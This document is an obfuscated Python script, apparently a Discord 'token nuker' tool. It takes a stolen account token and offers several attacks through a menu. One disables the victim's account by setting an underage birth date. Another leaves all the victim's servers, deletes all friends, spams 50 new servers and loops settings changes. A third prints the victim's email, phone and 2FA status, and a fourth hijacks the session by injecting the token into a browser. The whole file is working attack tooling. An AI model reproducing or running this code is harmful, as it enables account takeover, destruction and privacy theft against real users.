import threading #line:1
import requests #line:2
import discord #line:3
import random #line:4
import time #line:5
import os #line:6
from colorama import Fore ,init #line:8
from selenium import webdriver #line:9
from datetime import datetime #line:10
from itertools import cycle #line:11
init (convert =True )#line:13
guildsIds =[]#line:14
friendsIds =[]#line:15
clear =lambda :os .system ('cls')#line:16
clear ()#line:17
class Login (discord .Client ):#line:19
    async def on_connect (O00000000000OOOOO ):#line:20
        for OO00OO000OOO0O0OO in O00000000000OOOOO .guilds :#line:21
            guildsIds .append (OO00OO000OOO0O0OO .id )#line:22
        for OO0OO00OOOO000OOO in O00000000000OOOOO .user .friends :#line:24
            friendsIds .append (OO0OO00OOOO000OOO .id )#line:25
        await O00000000000OOOOO .logout ()#line:27
    def run (OO0OO0O0O00000OO0 ,OOOOOOO0000O00OO0 ):#line:29
        try :#line:30
            super ().run (OOOOOOO0000O00OO0 ,bot =False )#line:31
        except Exception as O0OOO00OO00O0O0O0 :#line:32
            print (f"[{Fore.RED}-{Fore.RESET}] Invalid token",O0OOO00OO00O0O0O0 )#line:33
            input ("Press any key to exit...");exit (0 )#line:34
def tokenLogin (O00O00O00O00O0O00 ):#line:36
    O0OOOOO0OO0OOOOOO =webdriver .ChromeOptions ()#line:37
    O0OOOOO0OO0OOOOOO .add_experimental_option ("detach",True )#line:38
    O00O0O00OOO000O00 =webdriver .Chrome ('chromedriver.exe',options =O0OOOOO0OO0OOOOOO )#line:39
    O000OO0O0O0O000OO ="""
            function login(token) {
            setInterval(() => {
            document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`
            }, 50);
            setTimeout(() => {
            location.reload();
            }, 2500);
            }
            """#line:49
    O00O0O00OOO000O00 .get ("https://discord.com/login")#line:50
    O00O0O00OOO000O00 .execute_script (O000OO0O0O0O000OO +f'\nlogin("{O00O00O00O00O0O00}")')#line:51
def tokenInfo (O00000OO00O00OOO0 ):#line:53
    OO0O000000O0OOOO0 ={'Authorization':O00000OO00O00OOO0 ,'Content-Type':'application/json'}#line:54
    O00O0OO0O00000000 =requests .get ('https://discord.com/api/v6/users/@me',headers =OO0O000000O0OOOO0 )#line:55
    if O00O0OO0O00000000 .status_code ==200 :#line:56
            O000OO0OO0OO0O0OO =O00O0OO0O00000000 .json ()['username']+'#'+O00O0OO0O00000000 .json ()['discriminator']#line:57
            OO00O0O00O0000OOO =O00O0OO0O00000000 .json ()['id']#line:58
            O0OOOO00OO0OOOOOO =O00O0OO0O00000000 .json ()['phone']#line:59
            O00O00O0OOO000000 =O00O0OO0O00000000 .json ()['email']#line:60
            OO0OO0OO000OO0000 =O00O0OO0O00000000 .json ()['mfa_enabled']#line:61
            print (f'''
            [{Fore.BLUE}User ID{Fore.RESET}]         {OO00O0O00O0000OOO}
            [{Fore.BLUE}User Name{Fore.RESET}]       {O000OO0OO0OO0O0OO}
            [{Fore.BLUE}2 Factor{Fore.RESET}]        {OO0OO0OO000OO0000}
            [{Fore.BLUE}Email{Fore.RESET}]           {O00O00O0OOO000000}
            [{Fore.BLUE}Phone number{Fore.RESET}]    {O0OOOO00OO0OOOOOO if O0OOOO00OO0OOOOOO else ""}
            [{Fore.BLUE}Token{Fore.RESET}]           {O00000OO00O00OOO0}
            ''')#line:69
            input ()#line:70
def tokenFuck (OOOOO000O0O0OOO0O ):#line:72
    O00O0O00000OOOOO0 ={'Authorization':OOOOO000O0O0OOO0O }#line:73
    print (f"[{Fore.BLUE}#{Fore.RESET}] HqckedByjspwala...")#line:74
    for OO00O0OO0O0O00000 in guildsIds :#line:76
        requests .delete (f'https://discord.com/api/v6/users/@me/guilds/{OO00O0OO0O0O00000}',headers =O00O0O00000OOOOO0 )#line:77
    for O00OO00OOOO0OO0OO in friendsIds :#line:79
        requests .delete (f'https://discord.com/api/v6/users/@me/relationships/{O00OO00OOOO0OO0OO}',headers =O00O0O00000OOOOO0 )#line:80
    for O000O00000O0O000O in range (50 ):#line:82
        OO0O0OOO00OOO0000 ={'name':f'jspwala {O000O00000O0O000O}','region':'europe','icon':None ,'channels':None }#line:83
        requests .post ('https://discord.com/api/v6/guilds',headers =O00O0O00000OOOOO0 ,json =OO0O0OOO00OOO0000 )#line:84
    O0000OO00O000OO00 =cycle (["light","dark"])#line:86
    while True :#line:87
        O0O0O000O0O0O0OOO ={'theme':next (O0000OO00O000OO00 ),'locale':random .choice (['ja','zh-TW','ko','zh-CN'])}#line:88
        requests .patch ("https://discord.com/api/v6/users/@me/settings",headers =O00O0O00000OOOOO0 ,json =O0O0O000O0O0O0OOO )#line:89
def tokenDisable (O00OOO0000O00OO0O ):#line:91
    OO0000O0OO0000O00 =requests .patch ('https://discordapp.com/api/v6/users/@me',headers ={'Authorization':O00OOO0000O00OO0O },json ={'date_of_birth':'2015-7-16'})#line:92
    if OO0000O0OO0000O00 .status_code ==400 :#line:93
        print (f'[{Fore.BLUE}#{Fore.RESET}] Account disabled successfully')#line:94
        input ("Thx Nerox  you're the best...")#line:95
    else :#line:96
        print (f'[{Fore.RED}-{Fore.RESET}] Invalid token')#line:97
        input ("Thx Nerox you're the best...")#line:98
def getBanner ():#line:100
    O0O0O0O0O00000O00 =f'''

            [{Fore.RED}>{Fore.RESET}] 
            [{Fore.RED}<{Fore.RESET}]  Nerox > dev js dsl
                
                
                
                
                
                
                
                
                [{Fore.BLUE}1{Fore.RESET}] Disable Token  
                [{Fore.BLUE}2{Fore.RESET}] Destroy Token
                [{Fore.BLUE}3{Fore.RESET}] Info Token 
                [{Fore.BLUE}4{Fore.RESET}] DON'T WORK !
    '''.replace ('░',f'{Fore.RED}░{Fore.RESET}')#line:117
    return O0O0O0O0O00000O00 #line:118
def startMenu ():#line:120
    print (getBanner ())#line:121
    print (f'[{Fore.BLUE}->{Fore.RESET}] Choose one ! ',end ='');OOOOOOOOOO0000000 =str (input ('  :  '))#line:122
    if OOOOOOOOOO0000000 =='1':#line:123
        print (f'[{Fore.BLUE}->{Fore.RESET}] Enter the Token ',end ='');O0O00OOO0O0OOOOO0 =input ('  :  ')#line:124
        tokenDisable (O0O00OOO0O0OOOOO0 )#line:125
    elif OOOOOOOOOO0000000 =='2':#line:127
        print (f'[{Fore.BLUE}->{Fore.RESET}] Enter the Token ',end ='');O0O00OOO0O0OOOOO0 =input ('  :  ')#line:128
        print (f'[{Fore.BLUE}->{Fore.RESET}] Threads number',end ='');OO0O00OOOO000OO0O =input ('  :  ')#line:129
        Login ().run (O0O00OOO0O0OOOOO0 )#line:130
        if threading .active_count ()<int (OO0O00OOOO000OO0O ):#line:131
            OOOO0OOOO00OOO00O =threading .Thread (target =tokenFuck ,args =(O0O00OOO0O0OOOOO0 ,))#line:132
            OOOO0OOOO00OOO00O .start ()#line:133
    elif OOOOOOOOOO0000000 =='3':#line:135
        print (f'[{Fore.BLUE}->{Fore.RESET}] Enter the Token',end ='');O0O00OOO0O0OOOOO0 =input ('  :  ')#line:136
        tokenInfo (O0O00OOO0O0OOOOO0 )#line:137
    elif OOOOOOOOOO0000000 =='4':#line:139
        print (f'[{Fore.BLUE}->{Fore.RESET}] No,Dont work contact terminal.wyz#0789 on discord !',end ='');O0O00OOO0O0OOOOO0 =input ('  :  ')#line:140
        tokenLogin (O0O00OOO0O0OOOOO0 )#line:141
    elif OOOOOOOOOO0000000 .isdigit ()==False :#line:143
        clear ()#line:144
        startMenu ()#line:145
    else :#line:147
        clear ()#line:148
        startMenu ()#line:149
if __name__ =='__main__':#line:151
    startMenu ()#line:152
